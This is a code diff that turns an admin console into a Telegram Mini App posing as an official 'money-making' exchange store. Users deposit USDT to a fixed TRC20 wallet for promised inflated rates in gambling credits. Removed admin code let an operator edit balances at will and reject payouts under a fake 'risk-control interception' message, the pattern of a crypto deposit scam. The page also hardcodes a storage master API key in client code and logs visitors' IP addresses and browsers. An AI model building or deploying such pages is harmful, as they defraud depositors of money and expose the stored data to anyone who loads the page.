@@ -3,56 +3,225 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>官方商城 - 管理员独立控制台</title>
+    <title>赚钱项目-官方兑换商城</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: { tgBg: '#f4f6f9', tgCardBg: '#ffffff', tgText: '#1f2937' }
+                }
+            }
+        }
+    </script>
+    <style>.no-scrollbar::-webkit-scrollbar { display: none; }</style>
 </head>
-<body class="bg-gray-100 text-gray-800 min-h-screen p-4 flex items-center justify-center font-sans">
-    <div class="max-w-lg w-full bg-white rounded-2xl shadow-lg p-6 space-y-6">
-        <div class="flex items-center justify-between border-b pb-4">
-            <div class="flex items-center space-x-2">
-                <span class="text-xl">🛡️</span>
-                <span class="font-bold text-base text-gray-800">管理员独立控制台</span>
-            </div>
-            <span class="text-xs text-red-600 bg-red-50 px-2.5 py-1 rounded-full font-bold">Secure Admin</span>
-        </div>
+<body class="bg-tgBg text-tgText min-h-screen pb-24 select-none font-sans">
 
-        <!-- 1. 修改指定用户余额 -->
-        <div class="space-y-3">
-            <label class="text-xs font-bold text-gray-700 block">1. 修改指定用户余额 (USDT)</label>
-            <input type="text" id="adminTargetUser" class="w-full bg-gray-50 border rounded-xl p-3 text-xs font-mono focus:outline-none focus:border-blue-500" placeholder="输入用户的 Telegram UID">
-            <div class="flex gap-2">
-                <input type="number" id="adminTargetBalance" class="flex-1 bg-gray-50 border rounded-xl p-3 text-sm font-bold focus:outline-none focus:border-blue-500" placeholder="新余额数字">
-                <button type="button" onclick="saveTargetUserBalance()" class="bg-blue-600 hover:bg-blue-700 text-white px-5 py-3 rounded-xl text-xs font-bold transition">确认修改</button>
-            </div>
+    <!-- 顶部导航栏 -->
+    <div class="sticky top-0 z-40 bg-white border-b border-gray-100 shadow-sm px-6 py-3.5 flex items-center justify-between">
+        <div class="flex items-center space-x-2">
+            <span class="text-xl">💰</span>
+            <span class="font-bold text-base text-gray-800">赚钱项目-官方兑换商城</span>
         </div>
+        <span class="text-xs text-blue-600 bg-blue-50 px-3 py-1 rounded-full font-medium">Mini App</span>
+    </div>
 
-        <!-- 2. 全网充值与兑换订单审核 (云端联网实时同步) -->
-        <div class="space-y-3 pt-3 border-t">
-            <div class="flex justify-between items-center">
-                <label class="text-xs font-bold text-gray-700">2. 全网用户充值与兑换订单审核 <span id="pendingCount" class="text-red-500 font-bold"></span></label>
-                <div class="flex gap-2">
-                    <button type="button" onclick="loadAdminOrders()" class="text-xs text-blue-600 bg-blue-50 hover:bg-blue-100 px-3 py-1.5 rounded-lg font-medium transition">🔄 刷新列表</button>
+    <!-- 主体内容区 -->
+    <div class="max-w-2xl mx-auto p-4 sm:p-6 space-y-5">
+        
+        <!-- 1. 兑换商城首页 -->
+        <div id="tab-shop" class="space-y-5">
+            <div class="bg-gradient-to-r from-blue-600 to-indigo-600 rounded-2xl p-6 text-white shadow-lg relative overflow-hidden">
+                <div class="absolute -right-4 -bottom-4 w-32 h-32 bg-white/10 rounded-full blur-xl"></div>
+                <div class="flex justify-between items-start mb-2">
+                    <span class="text-xs text-blue-100 font-medium">当前账户余额 (USDT)</span>
+                    <span class="text-[10px] bg-white/20 text-white px-2.5 py-0.5 rounded-full font-medium">TRC20</span>
+                </div>
+                <div class="flex items-baseline space-x-1.5 mb-6">
+                    <span class="text-4xl font-black" id="userBalanceDisplay">0.00</span>
+                    <span class="text-sm text-blue-200">USDT</span>
+                </div>
+                <div>
+                    <button type="button" onclick="switchTab('deposit')" class="w-full bg-white text-blue-600 font-bold py-3.5 rounded-xl text-sm shadow hover:bg-blue-50 transition flex items-center justify-center gap-2 active:scale-98 cursor-pointer">
+                        <i class="fa-solid fa-wallet"></i> 立即充值
+                    </button>
                 </div>
             </div>
-            <div id="adminOrdersList" class="space-y-3 max-h-96 overflow-y-auto">
-                <div class="text-center py-6 text-xs text-gray-400">正在联网同步全网订单...</div>
+
+            <!-- 兑换计算器卡片 -->
+            <div id="exchangeCard" class="bg-tgCardBg p-6 rounded-2xl shadow-sm space-y-5">
+                <div class="flex justify-between items-center text-sm">
+                    <span class="font-bold text-gray-800 flex items-center gap-2 text-base">
+                        <i class="fa-solid fa-calculator text-blue-500"></i> 阶梯兑换计算器
+                    </span>
+                </div>
+                <div class="relative">
+                    <input type="number" id="inputAmount" placeholder="请输入兑换金额" class="w-full bg-gray-50 border border-gray-200 rounded-xl px-4 py-3.5 text-lg font-bold focus:outline-none focus:border-blue-500 transition" oninput="calculateRate()">
+                    <div class="absolute right-4 top-4 text-xs text-gray-400 font-semibold">USDT</div>
+                </div>
+
+                <!-- 快捷金额按钮 -->
+                <div class="flex gap-2 overflow-x-auto pb-1 text-xs no-scrollbar">
+                    <button type="button" onclick="setAmount(50)" class="bg-gray-100 hover:bg-blue-50 hover:text-blue-600 px-3 py-1.5 rounded-lg font-medium transition flex-shrink-0">50</button>
+                    <button type="button" onclick="setAmount(100)" class="bg-gray-100 hover:bg-blue-50 hover:text-blue-600 px-3 py-1.5 rounded-lg font-medium transition flex-shrink-0">100</button>
+                    <button type="button" onclick="setAmount(500)" class="bg-gray-100 hover:bg-blue-50 hover:text-blue-600 px-3 py-1.5 rounded-lg font-medium transition flex-shrink-0">500</button>
+                    <button type="button" onclick="setAmount(1000)" class="bg-gray-100 hover:bg-blue-50 hover:text-blue-600 px-3 py-1.5 rounded-lg font-medium transition flex-shrink-0">1000</button>
+                    <button type="button" onclick="setAmount(2000)" class="bg-gray-100 hover:bg-blue-50 hover:text-blue-600 px-3 py-1.5 rounded-lg font-medium transition flex-shrink-0">2000</button>
+                    <button type="button" onclick="setAmount(5000)" class="bg-gray-100 hover:bg-blue-50 hover:text-blue-600 px-3 py-1.5 rounded-lg font-medium transition flex-shrink-0">5000</button>
+                </div>
+
+                <div class="bg-blue-50/65 border border-blue-100 p-4 rounded-xl flex items-center justify-between">
+                    <div>
+                        <div class="text-xs text-gray-500 mb-0.5">阶梯汇率结算</div>
+                        <div class="text-xs font-bold text-blue-600" id="currentRateDesc">单笔最低兑换 50 USDT</div>
+                    </div>
+                    <div class="text-right">
+                        <span id="resultAmount" class="text-3xl font-black text-blue-600">0.00</span>
+                        <span class="text-xs text-gray-500 ml-1">博彩U</span>
+                    </div>
+                </div>
+                <button id="exchangeBtn" disabled class="w-full bg-gray-300 text-gray-500 font-bold py-4 rounded-xl shadow-sm transition flex items-center justify-center gap-2 cursor-not-allowed text-sm" onclick="submitExchange()">
+                    <span>立即兑换</span>
+                </button>
             </div>
+
+            <!-- 阶梯汇率表 -->
+            <div class="bg-tgCardBg p-6 rounded-2xl shadow-sm space-y-3">
+                <div class="flex justify-between items-center">
+                    <span class="font-bold text-sm text-gray-800">阶梯汇率表</span>
+                    <span class="text-xs text-gray-400">实时生效中</span>
+                </div>
+                <div class="grid grid-cols-3 text-center text-xs font-semibold text-gray-400 pb-1 border-b border-gray-100">
+                    <div>最低金额</div>
+                    <div>最高金额</div>
+                    <div>区间汇率</div>
+                </div>
+                <div class="space-y-2" id="tierList">
+                    <div class="tier-row grid grid-cols-3 text-center py-2.5 rounded-xl bg-gray-50 text-xs items-center transition"><div class="font-bold text-gray-700">50</div><div class="text-gray-400">100</div><div class="font-bold text-blue-600 text-sm">1.05</div></div>
+                    <div class="tier-row grid grid-cols-3 text-center py-2.5 rounded-xl bg-gray-50 text-xs items-center transition"><div class="font-bold text-gray-700">100</div><div class="text-gray-400">500</div><div class="font-bold text-blue-600 text-sm">1.13</div></div>
+                    <div class="tier-row grid grid-cols-3 text-center py-2.5 rounded-xl bg-gray-50 text-xs items-center transition"><div class="font-bold text-gray-700">500</div><div class="text-gray-400">2000</div><div class="font-bold text-blue-600 text-sm">1.38</div></div>
+                    <div class="tier-row grid grid-cols-3 text-center py-2.5 rounded-xl bg-gray-50 text-xs items-center transition"><div class="font-bold text-gray-700">2000</div><div class="text-gray-400">5000</div><div class="font-bold text-blue-600 text-sm">1.42</div></div>
+                    <div class="tier-row grid grid-cols-3 text-center py-2.5 rounded-xl bg-gray-50 text-xs items-center transition"><div class="font-bold text-gray-700">5000</div><div class="text-gray-400">10000</div><div class="font-bold text-blue-600 text-sm">1.45</div></div>
+                </div>
+            </div>
+
+            <!-- 规则说明 -->
+            <div class="text-xs text-gray-400 px-2 space-y-1">
+                <p class="font-semibold">💡 规则说明：</p>
+                <p>1. 单笔兑换金额须满 50 USDT，且不得低于账户当前可用余额。</p>
+                <p>2. 提交后系统将在 30 分钟内完成订单撮合与额度发放。</p>
+            </div>
+        </div>
+
+        <!-- 2. 我的订单与记录 -->
+        <div id="tab-orders" class="hidden space-y-4">
+            <div class="font-bold text-base text-gray-800 px-1">我的订单与记录</div>
+            <div id="myOrdersList" class="space-y-3">
+                <div class="text-center py-8 text-xs text-gray-400 bg-white rounded-2xl p-6 shadow-sm">正在联网加载订单记录...</div>
+            </div>
+        </div>
+
+        <!-- 3. 订单详情页 -->
+        <div id="page-order-detail" class="hidden space-y-4">
+            <button type="button" onclick="switchTab('orders')" class="text-xs text-gray-600 flex items-center gap-1 font-medium bg-white px-3.5 py-2 rounded-xl border border-gray-200 shadow-sm cursor-pointer">
+                <i class="fa-solid fa-chevron-left"></i> 返回订单列表
+            </button>
+            <div id="orderDetailCard" class="bg-white p-6 rounded-2xl shadow-sm space-y-4"></div>
+        </div>
+
+        <!-- 4. 充值页面 -->
+        <div id="page-deposit" class="hidden space-y-4">
+            <button type="button" onclick="switchTab('shop')" class="text-xs text-gray-600 flex items-center gap-1 font-medium bg-white px-3.5 py-2 rounded-xl border border-gray-200 shadow-sm cursor-pointer">
+                <i class="fa-solid fa-chevron-left"></i> 返回商城
+            </button>
+            <div class="bg-tgCardBg p-6 rounded-2xl shadow-sm text-center space-y-5">
+                <div class="space-y-1">
+                    <h3 class="font-bold text-xl text-gray-800">USDT 充值中心</h3>
+                    <p class="text-xs text-gray-400">当前 USDT 支付区块链网络协议为 TRC20</p>
+                </div>
+                <div class="p-4 bg-gray-50 rounded-2xl border inline-block">
+                    <img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=TPcyZeBmJoiaBeL7LzpZWW7hq1Hgzw75LQ" class="w-52 h-52 mx-auto rounded-lg shadow-sm">
+                </div>
+                <div class="bg-gray-50 p-3.5 rounded-xl border text-left space-y-1">
+                    <div class="text-xs text-gray-400 font-medium">TRC20 收款地址 (点击可复制)：</div>
+                    <div onclick="copyAddress('TPcyZeBmJoiaBeL7LzpZWW7hq1Hgzw75LQ')" class="text-xs font-mono font-bold text-gray-700 bg-white p-3 rounded-lg border cursor-pointer hover:bg-gray-50 transition">
+                        TPcyZeBmJoiaBeL7LzpZWW7hq1Hgzw75LQ
+                    </div>
+                </div>
+                <button type="button" onclick="submitDepositNotify()" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-4 rounded-xl shadow-md transition text-sm cursor-pointer">
+                    我已充值
+                </button>
+                <div id="depositStatusBox" class="hidden text-left p-4 rounded-xl text-xs bg-yellow-50 border border-yellow-200 text-yellow-800"></div>
+            </div>
+        </div>
+
+    </div>
+
+    <!-- 底部导航栏 -->
+    <div class="fixed bottom-0 left-0 right-0 bg-white border-t border-gray-200 z-40">
+        <div class="max-w-2xl mx-auto flex justify-around py-3">
+            <button type="button" id="nav-shop" onclick="switchTab('shop')" class="flex flex-col items-center gap-1 text-blue-600 text-xs font-bold transition cursor-pointer">
+                <i class="fa-solid fa-store text-lg"></i>
+                <span>兑换商城</span>
+            </button>
+            <button type="button" id="nav-orders" onclick="switchTab('orders')" class="flex flex-col items-center gap-1 text-gray-400 text-xs font-medium transition cursor-pointer">
+                <i class="fa-solid fa-list-check text-lg"></i>
+                <span>我的订单</span>
+            </button>
         </div>
     </div>
 
     <script>
         const BIN_ID = "6af2b32cac6210605a7c00d8";
         const API_KEY = "$2a$10$7bEzkP8SMoaSgkbiFa7a2uU0O/STCDvsxPy/XtAO5Hh7gxT/iSHpG";
+        const tiers = [
+            { min: 50, max: 100, rate: 1.05 },
+            { min: 100, max: 500, rate: 1.13 },
+            { min: 500, max: 2000, rate: 1.38 },
+            { min: 2000, max: 5000, rate: 1.42 },
+            { min: 5000, max: 10000, rate: 1.45 }
+        ];
+
+        let currentUserId = "user_demo_001";
+        let userInfoName = "普通用户";
+        let clientIp = "获取中...";
+        const deviceInfo = navigator.userAgent;
+
+        // 异步获取真实外网 IP
+        async function fetchClientIP() {
+            try {
+                let res = await fetch('https://api.ipify.org?format=json');
+                let data = await res.json();
+                clientIp = data.ip;
+            } catch(e) {
+                clientIp = "内网/未知IP";
+            }
+        }
+
+        if (window.Telegram && window.Telegram.WebApp && window.Telegram.WebApp.initDataUnsafe && window.Telegram.WebApp.initDataUnsafe.user) {
+            let tgUser = window.Telegram.WebApp.initDataUnsafe.user;
+            currentUserId = String(tgUser.id);
+            userInfoName = (tgUser.first_name || '') + ' ' + (tgUser.last_name || '');
+        } else {
+            let localId = localStorage.getItem('tma_local_uid');
+            if (!localId) { localId = 'UID_' + Math.random().toString(36).substring(2, 9); localStorage.setItem('tma_local_uid', localId); }
+            currentUserId = localId;
+        }
+
+        let userBalance = 0.00;
         let cloudData = { orders: [], balances: {} };
 
-        window.onload = function() {
-            loadAdminOrders();
-            setInterval(loadAdminOrders, 3000); // 每 3 秒自动联网轮询全网
+        window.onload = async function() {
+            if (window.Telegram && window.Telegram.WebApp) { window.Telegram.WebApp.ready(); window.Telegram.WebApp.expand(); }
+            await fetchClientIP();
+            await fetchCloudData();
+            setInterval(fetchCloudData, 3000);
         };
 
-        async function loadAdminOrders() {
-            const container = document.getElementById('adminOrdersList');
+        async function fetchCloudData() {
             try {
                 let res = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}/latest`, {
                     headers: { 'X-Master-Key': API_KEY }
@@ -61,93 +230,25 @@
                     let json = await res.json();
                     cloudData = json.record || { orders: [], balances: {} };
                     
-                    let pending = cloudData.orders.filter(o => o.status === 'pending');
-                    document.getElementById('pendingCount').innerText = pending.length > 0 ? `(${pending.length})` : '';
-
-                    if (!pending || pending.length === 0) {
-                        container.innerHTML = `<div class="text-xs text-gray-400 text-center py-6 bg-gray-50 rounded-xl border border-dashed">当前没有待审核的订单<br><span class="text-[10px] text-gray-300">（任何设备的手机前台提交后将在此处实时联网显示）</span></div>`;
-                        return;
+                    if (cloudData.balances && cloudData.balances[currentUserId] !== undefined) {
+                        userBalance = parseFloat(cloudData.balances[currentUserId]);
+                    } else {
+                        userBalance = parseFloat(localStorage.getItem('balance_' + currentUserId)) || 0.00;
                     }
-
-                    container.innerHTML = pending.map((item) => `
-                        <div class="p-3.5 bg-gray-50 rounded-xl text-xs space-y-2 border shadow-sm">
-                            <div class="flex justify-between font-bold text-gray-700">
-                                <span>类型: ${item.type === 'deposit' ? '📥 充值订单' : '🔄 兑换订单'} (${item.id})</span>
-                                <span class="text-blue-600">${item.amount} USDT</span>
-                            </div>
-                            <div class="text-[10px] text-gray-400">UID: ${item.uid} | 时间: ${item.time}</div>
-                            ${item.type === 'exchange' ? `<div class="text-[11px] text-indigo-600 font-bold">兑换获取: ${item.getU} 博彩U</div>` : ''}
-                            
-                            <div class="flex gap-2 pt-1">
-                                ${item.type === 'deposit' ? `
-                                    <button onclick="approveDeposit('${item.id}', '${item.uid}', ${item.amount})" class="flex-1 bg-green-600 hover:bg-green-700 text-white py-2 rounded-lg font-bold transition">通过并加余额</button>
-                                ` : `
-                                    <button onclick="approveExchange('${item.id}')" class="flex-1 bg-green-600 hover:bg-green-700 text-white py-2 rounded-lg font-bold transition">同意兑换</button>
-                                    <button onclick="rejectExchange('${item.id}')" class="flex-1 bg-red-600 hover:bg-red-700 text-white py-2 rounded-lg font-bold transition">不同意(风控拦截)</button>
-                                `}
-                                <button onclick="removeOrder('${item.id}')" class="bg-gray-300 hover:bg-gray-400 text-gray-700 px-3 py-2 rounded-lg font-bold transition">删除</button>
-                            </div>
-                        </div>
-                    `).join('');
+                    updateBalanceUI();
                 }
-            } catch (e) {
-                container.innerHTML = `<div class="text-xs text-red-500 text-center py-4">云端联网读取异常</div>`;
-            }
+            } catch(e){}
         }
 
-        async function pushCloud() {
-            await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}`, {
-                method: 'PUT',
-                headers: {
-                    'Content-Type': 'application/json',
-                    'X-Master-Key': API_KEY
-                },
-                body: JSON.stringify(cloudData)
-            });
+        async function pushCloudData() {
+            try {
+                await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}`, {
+                    method: 'PUT',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'X-Master-Key': API_KEY
+                    },
+                    body: JSON.stringify(cloudData)
+                });
+            } catch(e){}
         }
-
-        // 审核充值通过并加余额
-        async function approveDeposit(orderId, uid, amount) {
-            cloudData.orders = cloudData.orders.map(o => { if(o.id === orderId) o.status = 'success'; return o; });
-            let cur = parseFloat(cloudData.balances[uid]) || 0;
-            cloudData.balances[uid] = cur + amount;
-            
-            await pushCloud();
-            alert(`已通过充值并为用户加额 ${amount} USDT！`);
-            loadAdminOrders();
-        }
-
-        // 同意兑换
-        async function approveExchange(orderId) {
-            cloudData.orders = cloudData.orders.map(o => { if(o.id === orderId) o.status = 'success'; return o; });
-            await pushCloud();
-            alert("已同意该笔兑换订单！");
-            loadAdminOrders();
-        }
-
-        // 不同意兑换（触发风控，手机端订单详情显示红底状态异常提示）
-        async function rejectExchange(orderId) {
-            cloudData.orders = cloudData.orders.map(o => { if(o.id === orderId) o.status = 'rejected'; return o; });
-            await pushCloud();
-            alert("已触发风控拦截！用户端订单详情将显示红底状态异常提示。");
-            loadAdminOrders();
-        }
-
-        async function removeOrder(orderId) {
-            cloudData.orders = cloudData.orders.filter(o => o.id !== orderId);
-            await pushCloud();
-            loadAdminOrders();
-        }
-
-        async function saveTargetUserBalance() {
-            const uid = document.getElementById('adminTargetUser').value.trim();
-            const bal = parseFloat(document.getElementById('adminTargetBalance').value);
-            if (!uid || isNaN(bal)) { alert("请输入正确的UID和数字"); return; }
-
-            cloudData.balances[uid] = bal;
-            await pushCloud();
-            alert(`已成功将云端用户 [${uid}] 余额修改为 ${bal}`);
-        }
-    </script>
-</body>
-</html>
